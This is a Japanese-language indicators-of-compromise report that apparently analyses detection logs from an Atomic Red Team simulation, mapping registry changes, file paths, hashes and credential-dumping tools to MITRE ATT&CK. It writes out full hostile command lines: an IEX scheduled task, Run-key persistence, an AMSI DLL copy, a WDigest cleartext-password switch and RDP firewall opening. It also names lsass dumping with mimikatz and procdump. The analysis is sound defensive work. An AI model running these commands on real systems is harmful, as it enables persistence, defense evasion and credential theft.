@@ -1,0 +1,1521 @@
+IOCs (Indicators of Compromise)
+
+ファイルハッシュ情報を含むエントリの調査結果
+• エントリ1：レジストリ操作（reg.exe）によるシステム変更
+    ◦ タイムスタンプ: 2025年8月20日 12:53:27.053 (UTC時刻 2025-08-20 03:50:49.9508053Z)
+    ◦ プロセスイメージ: C:\Windows\System32\reg.exe
+    ◦ 親プロセス: C:\Windows\System32\cmd.exe
+    ◦ コマンドライン: cmd.exe /C reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f && schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min "\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 07:45
+    ◦ ファイルハッシュ:
+        ▪ MD5: EB20E119AAF500E2752DC5A588B54C12
+        ▪ SHA256: C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75
+        ▪ IMPHASH: E23A24F7BA9B35B3E9706724F6749860
+    ◦ 説明: Microsoft® Windows® Operating SystemのRegistry Console Toolであるreg.exeが実行され、レジストリキーにBase64類似のパターンを持つ値を追加しています。これは、ATT&CKのT1027 (難読化されたファイルまたは情報) およびT1112 (レジストリの変更) に該当する可能性があります。
+• エントリ2：レジストリ操作（reg.exe）によるアプリケーション実行の変更
+    ◦ タイムスタンプ: 2025年8月20日 12:58:44.1555997Z
+    ◦ プロセスイメージ: C:\Windows\System32\reg.exe
+    ◦ 親プロセス: C:\Windows\System32\cmd.exe
+    ◦ コマンドライン: cmd.exe /C reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command" /ve /d "calc.exe" /f
+    ◦ ファイルハッシュ:
+        ▪ MD5: EB20E119AAF500E2752DC5A588B54C12
+        ▪ SHA256: C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75
+        ▪ IMPHASH: E23A24F7BA9B35B3E9706724F6749860
+    ◦ 説明: reg.exeが、ごみ箱のCLSIDに関連するレジストリキーを変更し、calc.exeを実行するように設定しています。これは、攻撃者が正規の機能を利用して永続化を図る一般的な手法です。関連アラートとして「Value added to registry key has Base64-like pattern」が検出されています。
+• エントリ3：レジストリ操作（reg.exe）によるDLLハイジャックの試み
+    ◦ タイムスタンプ: 2025年8月20日 13:01:54.2275930Z
+    ◦ プロセスイメージ: C:\Windows\System32\reg.exe
+    ◦ 親プロセス: C:\Windows\System32\cmd.exe
+    ◦ コマンドライン: cmd.exe /C copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll && ren %APPDATA%\amsi.dll WinAppXRT.dll && copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll && reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
+    ◦ ファイルハッシュ:
+        ▪ MD5: EB20E119AAF500E2752DC5A588B54C12
+        ▪ SHA256: C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75
+        ▪ IMPHASH: E23A24F7BA9B35B3E9706724F6749860
+    ◦ 説明: reg.exeが、amsi.dllをコピーし、名前を変更して、システムの環境変数に登録しようとしています。これは、アンチマルウェアスキャンインターフェース（AMSI）のバイパス、あるいはDLLサイドローディングなどの防御回避（Defense Evasion）技術（ATT&CK T1027, T1112）の試みである可能性が高いです。
+• エントリ4：レジストリ操作（reg.exe）による永続化の試み
+    ◦ タイムスタンプ: 2025年8月20日 13:31:00.909 (UTC時刻 2025-08-20 04:30:59.871)
+    ◦ プロセスイメージ: C:\Windows\System32\reg.exe
+    ◦ 親プロセス: C:\Windows\System32\cmd.exe
+    ◦ コマンドライン: reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
+    ◦ ファイルハッシュ:
+        ▪ MD5: EB20E119AAF500E2752DC5A588B54C12
+        ▪ SHA256: C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75
+        ▪ IMPHASH: E23A24F7BA9B35B3E9706724F6749860
+    ◦ 説明: reg.exeが、システムの起動時にcalc.exeを実行するようRunレジストリキーを追加しています。これは、システム再起動後もマルウェアが永続的に実行されるようにするための一般的な手法（ATT&CK T1027, T1112）です。関連するアラートは「Value added to registry key has Base64-like pattern」です。
+• エントリ5：レジストリ操作（reg.exe）によるWDigestプロトコルの変更
+    ◦ タイムスタンプ: 2025年8月20日 13:31:52.947 (UTC時刻 2025-08-20 04:31:51.904)
+    ◦ プロセスイメージ: C:\Windows\System32\reg.exe
+    ◦ 親プロセス: C:\Windows\System32\cmd.exe
+    ◦ コマンドライン: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+    ◦ ファイルハッシュ:
+        ▪ MD5: EB20E119AAF500E2752DC5A588B54C12
+        ▪ SHA256: C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75
+        ▪ IMPHASH: E23A24F7BA9B35B3E9706724F6749860
+    ◦ 説明: reg.exeがWDigestレジストリキーのUseLogonCredentialの値を1に設定しています。この変更は、通常、攻撃者がメモリにクリアテキストパスワードを保存させることで、資格情報のダンプ（Credential Dumping）を容易にするために行われることがあります。関連するアラートは「Value added to registry key has Base64-like pattern」です。
+• エントリ6：レジストリ操作（reg.exe）とファイアウォール変更（netsh.exe）によるRDPポート変更
+    ◦ タイムスタンプ: 2025年8月20日 14:58:50.6258149Z
+    ◦ プロセスイメージ: C:\Windows\System32\reg.exe
+    ◦ 親プロセス: C:\Windows\System32\cmd.exe
+    ◦ コマンドライン: cmd.exe /C reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
+    ◦ ファイルハッシュ:
+        ▪ MD5: EB20E119AAF500E2752DC5A588B54C12
+        ▪ SHA256: C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75
+        ▪ IMPHASH: E23A24F7BA9B35B3E9706724F6749860
+    ◦ 説明: reg.exeがRDPポートを4489に変更し、さらにnetsh.exeがそのポートを許可するファイアウォールルールを追加しています。これは、RDPを介したリモートアクセスを確立または変更し、防御を回避するための試み（ATT&CK T1027, T1112, T1562.004）であると考えられます。
+• エントリ7：ファイアウォール変更（netsh.exe）によるRDPポートの許可
+    ◦ タイムスタンプ: 2025年8月20日 14:58:50.6440242Z
+    ◦ プロセスイメージ: C:\Windows\System32\netsh.exe
+    ◦ 親プロセス: C:\Windows\System32\cmd.exe
+    ◦ コマンドライン: netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
+    ◦ ファイルハッシュ:
+        ▪ MD5: 28B5A3688253FD5822EE90BCAE2633F7
+        ▪ SHA256: 7482890B1875BDCEC826F3385EAC7DCDC38F17358A13B1B8C790BDB895FF5054
+        ▪ IMPHASH: 06F091DBEC9C3F0DD14808FFE59B95DE
+    ◦ 説明: netsh.exeが、RDPポート4489へのTCPインバウンド接続を許可するファイアウォールルールを追加しています。これは、防御回避（Disable or Modify System Firewall, ATT&CK T1562.004）の一環として行われた可能性が高いです。
+
+
+
+
+
+
+検出されたディレクトリパス
+• C:\\Users\\Public\\
+• C:\\Windows\\System32\\
+• C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\
+• %%APPDATA%%\\
+• PathToAtomicsFolder\\..\\ExternalPayloads\\ (特定のフォルダへの相対パスのプレースホルダー)
+• C:\\Windows\\SystemTemp\\
+• C:\\Windows\\SystemTemp\\51yz0cew\\
+• C:\\Windows\\SystemTemp\\bbrrtwa2\\
+• C:\\Windows\\SystemTemp\\fgfgtfav\\
+• C:\\Windows\\SystemTemp\\v1slex2h\\
+• C:\\Windows\\Temp\\
+• C:\\inetpub\\wwwroot
+• C:\\Program Files (x86)\\KeyScrambler\\
+• c:\\
+• c:\\Documents and Settings\\
+• c:\\Program Files\\
+• %%systemdrive%%\\Users\\
+• %%userprofile%%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\
+• %%userprofile%%\\Desktop\\
+• /etc/
+• /etc/wazuh-indexer/opensearch-security/
+• /etc/wazuh-indexer/backup/
+検出された特定のファイルパス
+（これは、システムに存在する一般的な実行ファイルやDLLではなく、作成、ダウンロード、コピー、または操作の対象となった特定のファイルへのパスです。）
+• $env:TEMP\\PhishingAttachment.xlsm
+• C:\\Users\\Public\\art.jse
+• C:\\Users\\Public\\be0315_AllTheThingsx64.dll
+• C:\\Users\\Public\\6349c0_calc.dll
+• not_an_scr.scr
+• PathToAtomicsFolder\\T1218.011\\src\\80d0e0_T1218.011.inf
+• PathToAtomicsFolder\\T1218.011\\src\\4c870d_T1218.011_DefaultInstall.inf
+• PathToAtomicsFolder\\T1218.011\\src\\index.hta
+• PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs
+• %%temp%%\\nanodump.dmp
+• %%tmp%%\\lsass.DMP
+• C:\\Windows\\Temp\\lsass_dump.dmp
+• %%temp%%\\SilentProcessExit
+• %%temp%%\\T1083Test1.txt
+• C:\\Windows\\Temp\\PotentiallyUnwanted.exe
+• C:\\Windows\\Temp\\a.exe
+• C:\\Windows\\Temp\\KeyScrambler_Setup.exe
+• C:\\Windows\\Temp\\KeyScrambler.exe
+• C:\\Windows\\Temp\\xordump.exe
+• C:\\Path\\AtomicRedTeam.exe
+• C:\\Path\\AtomicRedTeam.dll
+• C:\\Windows\\SystemTemp\\__PSScriptPolicyTest_*.ps1
+• C:\\Windows\\SystemTemp\\51yz0cew\\51yz0cew.cmdline
+• C:\\Windows\\SystemTemp\\51yz0cew\\51yz0cew.dll
+• C:\\Windows\\SystemTemp\\bbrrtwa2\\bbrrtwa2.cmdline
+• C:\\Windows\\SystemTemp\\bbrrtwa2\\bbrrtwa2.dll
+• C:\\Windows\\SystemTemp\\fgfgtfav\\fgfgtfav.cmdline
+• C:\\Windows\\SystemTemp\\fgfgtfav\\fgfgtfav.dll
+• C:\\Windows\\SystemTemp\\v1slex2h\\v1slex2h.cmdline
+• C:\\Windows\\SystemTemp\\v1slex2h\\v1slex2h.dll
+• %%APPDATA%%\\updater.exe
+• %%APPDATA%%\\amsi.dll
+• %%APPDATA%%\\WinAppXRT.dll
+• %%windir%%\\System32\\WinAppXRT.dll
+
+
+
+
+以下の動きについて
+
+
+・/etc/passwd
+• /etc/ld.so.cache
+• /etc/passwd-
+• /etc/wazuh-indexer/opensearch-security/internal_users.yml
+• /etc/wazuh-indexer/backup/allowlist.yml
+• /etc/wazuh-indexer/backup/action_groups.yml
+• /etc/wazuh-indexer/backup/audit.yml
+• /etc/wazuh-indexer/backup/config.yml
+• /etc/wazuh-indexer/backup/tenants.yml
+• /etc/wazuh-indexer/backup/internal_users.yml
+• /etc/wazuh-indexer/backup/nodes_dn.yml
+• /etc/wazuh-indexer/backup/roles_mapping.yml
+• /etc/wazuh-indexer/backup/opensearch.yml.example
+• /etc/wazuh-indexer/backup/roles.yml
+• /etc/wazuh-indexer/backup/whitelist.yml
+
+
+• イベントの種類: 変更されました。
+• 発生日時: 2025年8月20日 20:47:32.527。
+• 変更内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:50:18。
+    ◦ 変更後の最終修正時刻 (mtime_after): 2025年8月19日 23:45:10。
+    ◦ 変更前のファイルサイズ (size_before): 1713 バイト。
+    ◦ 変更後のファイルサイズ (size_after): 1390954 バイト。
+    ◦ 変更前後のMD5, SHA1, SHA256ハッシュ値が記録されています。
+• 検知ルール: "Integrity checksum changed." (整合性チェックサムが変更されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: Stored Data Manipulation (保存データの操作)。
+    ◦ タクティクス: Impact (影響)。
+• イベントの種類: 変更されました。
+• 発生日時: 2025年8月20日 20:47:32.541。
+• 変更内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:50:32。
+    ◦ 変更後の最終修正時刻 (mtime_after): 2025年8月19日 23:46:14。
+    ◦ 変更前のファイルサイズ (size_before): 14199 バイト。
+    ◦ 変更後のファイルサイズ (size_after): 1390958 バイト。
+    ◦ 変更前後のMD5, SHA1, SHA256ハッシュ値が記録されています。
+• 検知ルール: "Integrity checksum changed." (整合性チェックサムが変更されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: Stored Data Manipulation (保存データの操作)。
+    ◦ タクティクス: Impact (影響)。
+• イベントの種類: 変更されました。
+• 発生日時: 2025年8月20日 20:47:32.738。
+• 変更内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:55。
+    ◦ 変更後の最終修正時刻 (mtime_after): 2025年8月19日 23:43:33。
+    ◦ 変更前のファイルサイズ (size_before): 1644 バイト。
+    ◦ 変更後のファイルサイズ (size_after): 87841 バイト。
+    ◦ 変更前後のMD5, SHA1, SHA256ハッシュ値が記録されています。
+• 検知ルール: "Integrity checksum changed." (整合性チェックサムが変更されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: Stored Data Manipulation (保存データの操作)。
+    ◦ タクティクス: Impact (影響)。
+• イベントの種類: 変更されました。
+• 発生日時: 2025年8月20日 20:47:32.745。
+• 変更内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:44。
+    ◦ 変更後の最終修正時刻 (mtime_after): 2025年8月19日 23:47:13。
+    ◦ 変更前のファイルサイズ (size_before): 1491 バイト。
+    ◦ 変更後のファイルサイズ (size_after): 1390371 バイト。
+    ◦ 変更前後のMD5, SHA1, SHA256ハッシュ値が記録されています。
+• 検知ルール: "Integrity checksum changed." (整合性チェックサムが変更されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: Stored Data Manipulation (保存データの操作)。
+    ◦ タクティクス: Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.526。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 153 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.526。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 54 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.526。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 795 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.526。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 3894 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.527。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 125 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.527。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 1491 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.527。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 49 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.527。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 1236 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.527。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:14。
+    ◦ 変更前のファイルサイズ (size_before): 12381 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.527。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 10785 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+• イベントの種類: 削除されました。
+• 発生日時: 2025年8月20日 20:47:34.527。
+• 削除内容:
+    ◦ 変更前の最終修正時刻 (mtime_before): 2025年8月19日 23:47:16。
+    ◦ 変更前のファイルサイズ (size_before): 153 バイト。
+    ◦ 削除前のMD5, SHA1, SHA256ハッシュ値が記録されています。
+    ◦ 削除モード: scheduled (スケジュールされた削除)。
+• 検知ルール: "File deleted." (ファイルが削除されました)。
+• MITRE ATT&CK:
+    ◦ テクニック: File Deletion (ファイル削除), Data Destruction (データ破壊)。
+    ◦ タクティクス: Defense Evasion (防御回避), Impact (影響)。
+
+
+
+
+1. 初期アクセスと実行に関連するファイル
+• C:\Users\Public\ca.exe
+    ◦ これは、後の多くの悪意のあるアクティビティ（PowerShellスクリプトの実行、cmd.exeコマンド、さまざまなrundll32.exe操作など）の親プロセスとして頻繁に特定されています。
+• powershell.exe
+    ◦ 実行: 「critical severity元データ.txt」によると、Word文書のマクロによってダウンロードされたInvoke-MalDoc.ps1スクリプトを介してPowershellが実行され、悪意のあるドキュメントが作成されました。
+        ▪ 2025年8月20日 12:06:41.804 に C:\Users\Public\ca.exe (PID 4224) から powershell.exe が Invoke-MalDoc.ps1 を使用して C:\Users\Public\art.jse を作成し、ping 8.8.8.8 を実行するように指示しました。
+        ▪ 2025年8月20日 12:25:13.543 に C:\Users\Public\ca.exe (PID 5968) から同様のコマンドが実行され、C:\Users\Public\art.jse が cscript.exe C:\Users\Public\art.jse を実行するように指示されました。
+    ◦ スクリプトの作成と実行: 「normal severity元データ.txt」のSysmon Event ID 11ログによると、powershell.exe は C:\Windows\SystemTemp\ ディレクトリに一時的なPowerShellスクリプトファイル（例: __PSScriptPolicyTest_*.ps1）を多数作成しています。
+        ▪ これらのファイル作成イベントは、MITRE ATT&CK の「T1105 (Ingress Tool Transfer)」および「Command and Control」 に分類されています。
+    ◦ Base64エンコードされたスクリプト: 「high severity元データ.txt」には、PowerShellスクリプトブロック内で非常に大きなBase64エンコードされた文字列が多数記録されています。
+        ▪ これらのスクリプトは、TCPバックドア/シェルを確立するための機能 (TcpListenerクラスやプロセス入出力のリダイレクトなど) を含んでいます。
+        ▪ メモリ操作やWin32 API関数 (VirtualProtect, VirtualFreeExなど) の使用も見られ、リフレクティブDLLローディングなど、メモリ常駐型コード実行の可能性を示唆しています。
+• C:\Users\Public\art.jse
+    ◦ Wordマクロによって作成され、ping 8.8.8.8 または cscript.exe C:\Users\Public\art.jse の実行を目的としていました。
+• cmd.exe
+    ◦ 実行: net user guest /active:yes (ゲストユーザーアカウントの有効化)、rundll32.exeコマンド、レジストリ変更コマンド (reg add)、および資格情報ダンプツールの実行 など、多岐にわたるコマンドが実行されています。
+2. 防御回避と永続化に関連するファイル
+• rundll32.exe
+    ◦ 実行対象: notepad.exe、be0315_AllTheThingsx64.dll、6349c0_calc.dll、0391ca__WT.init,krnl (DLLと推測)、calc.exe など、多様なファイルが実行されています。
+    ◦ スクリーンセーバーの設定: calc.exe を not_an_scr.scr としてコピーし、スクリーンセーバーとしてインストールするのに使用されました。
+    ◦ ファイル作成: rundll32.exe が C:\Windows\SystemTemp\__PSScriptPolicyTest_202e5j0l.url.ps1 を作成したことが観測されています。これは 0391ca__WT.init,krnl の実行に関連している可能性があります。
+• pcwutl.dll: notepad.exe を起動するために rundll32.exe コマンドで参照されています。
+• be0315_AllTheThingsx64.dll: rundll32.exe を介して実行されました。
+• shell32.dll: 6349c0_calc.dll を実行するために rundll32.exe コマンドで参照されています。
+• 6349c0_calc.dll
+    ◦ 作成: C:\Users\Public\6349c0_calc.dll として作成されました。
+    ◦ 実行: rundll32.exe と shell32.dll を介して実行されました。
+• calc.exe
+    ◦ コピーとリネーム: System32 から not_an_scr.scr としてコピーされ、スクリーンセーバーとしてインストールされました。
+    ◦ 実行: rundll32.exe と url.dll を介して実行されました。
+    ◦ 永続化: システム起動時に自動実行されるようにレジストリ (HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run, SecurityHealth) に追加されました。また、ごみ箱を開いたときに実行されるようにレジストリが変更されました。
+• not_an_scr.scr: calc.exe のコピーとして作成され、スクリーンセーバーとしてインストールされました。
+• 0391ca__WT.init (おそらくDLL): rundll32.exe を介して実行されました。C:\Windows\SystemTemp\__PSScriptPolicyTest_202e5j0l.url.ps1 の作成に関連しています。
+• url.dll: calc.exe の実行を処理するために rundll32.exe コマンドで参照されています。
+• reg.exe
+    ◦ 実行とハッシュ: ファイルハッシュは SHA256=C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75 で、様々なレジストリキーの変更に使用されています。
+    ◦ レジストリ変更による永続化と防御回避:
+        ▪ ファイル拡張子を非表示にするためのレジストリ変更。
+        ▪ calc.exe を起動時に実行するようにレジストリに設定。
+        ▪ WDigestのログオン資格情報使用を有効にするレジストリ変更（資格情報ダンプの準備）。
+        ▪ Base64デコードされたコマンド（ping 127.0.0.1）を実行するスケジュールタスクのレジストリ追加。
+        ▪ AtomicRedTeam.exe と AtomicRedTeam.dll を永続化のためにレジストリ（RunおよびRunOnceEx）に追加。これらのファイル自体は、提供されたソースに具体的なハッシュ情報がありません。
+        ▪ ごみ箱の動作を変更し、calc.exe を起動するようにレジストリを設定。
+        ▪ amsi.dll をコピーしてリネームし、APPX_PROCESS 環境変数を設定するレジストリ追加。
+        ▪ ターミナルサービスおよびRDP認証設定のレジストリ変更。
+    ◦ これらのレジストリアクションは一貫して MITRE ATT&CK の「T1027 (Obfuscated Files or Information)」および「T1112 (Modify Registry)」 に分類されています.
+3. 資格情報アクセスとその他のツールに関連するファイル
+• procdump.exe: lsass.exe のメモリをダンプするために実行されました。
+• lsass.exe: procdump.exe および mimikatz.exe によってメモリダンプのターゲットとなりました。
+• Outflank-Dumpert.exe: 別の資格情報ダンプツールとして実行されました。
+• nanodump.x64.exe: 一時ファイルにメモリをダンプするために実行されました。
+• mimikatz.exe: ダンプされた lsass.DMP ファイルからログオンパスワードを抽出するために実行されました。
+• pypykatz: LSAシークレットをライブで抽出するために実行されました。
+4. その他の作成された実行ファイル
+• C:\Windows\Temp\PotentiallyUnwanted.exe: powershell.exe によって作成されました。
+• C:\Windows\Temp\a.exe: powershell.exe によって作成されました。
+• C:\Windows\SystemTemp\fgfgtfav\fgfgtfav.dll: powershell.exe によって作成されました。
+• C:\Windows\SystemTemp\fgfgtfav\fgfgtfav.cmdline: powershell.exe によって作成されました。
+• C:\Windows\SystemTemp\51yz0cew\51yz0cew.dll: powershell.exe によって作成されました。
+• C:\Windows\SystemTemp\51yz0cew\51yz0cew.cmdline: powershell.exe によって作成されました。
+• C:\Windows\SystemTemp\bbrrtwa2\bbrrtwa2.dll: powershell.exe によって作成されました。
+• C:\Windows\Temp\KeyScrambler_Setup.exe: powershell.exe によって作成されました。
+
+スクリプト
+
+一時PowerShellスクリプト ()
+• C:\Windows\SystemTemp__PSScriptPolicyTest_olugegov.euz.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 02:41:19.703
+• C:\Windows\SystemTemp__PSScriptPolicyTest_b4l4in15.aje.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 02:41:45.416
+• C:\Windows\SystemTemp__PSScriptPolicyTest_4xivlm0o.4pq.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 02:41:58.778
+• C:\Windows\SystemTemp__PSScriptPolicyTest_gaszw3wx.pda.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:05:46.800
+• C:\Windows\SystemTemp__PSScriptPolicyTest_tgqr0pca.zqo.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:06:40.866
+• C:\Windows\SystemTemp__PSScriptPolicyTest_tngrnzgq.ylk.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:07:38.689
+• C:\Windows\SystemTemp__PSScriptPolicyTest_ozv3jh0e.ssx.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:08:41.692
+• C:\Windows\SystemTemp__PSScriptPolicyTest_xiirso1v.xuz.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:10:12.710
+• C:\Windows\SystemTemp__PSScriptPolicyTest_ehqcdb2w.svi.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:11:44.726
+• C:\Windows\SystemTemp__PSScriptPolicyTest_xfqyoojf.di0.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:12:46.531
+• C:\Windows\SystemTemp__PSScriptPolicyTest_21xtvthe.m2s.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:13:40.561
+• C:\Windows\SystemTemp__PSScriptPolicyTest_euqgx1jt.yzh.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:15:15.624
+• C:\Windows\SystemTemp__PSScriptPolicyTest_qbwts22h.bdm.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:18:52.687
+• C:\Windows\SystemTemp__PSScriptPolicyTest_gvjyacqm.osh.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:20:48.723
+• C:\Windows\SystemTemp__PSScriptPolicyTest_qka40r31.lsh.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:21:52.756
+• C:\Windows\SystemTemp__PSScriptPolicyTest_ki1pp4jr.xpn.ps1
+    ◦ 作成UTCタイムスタンプ: 2025-08-20 03:22:54.749
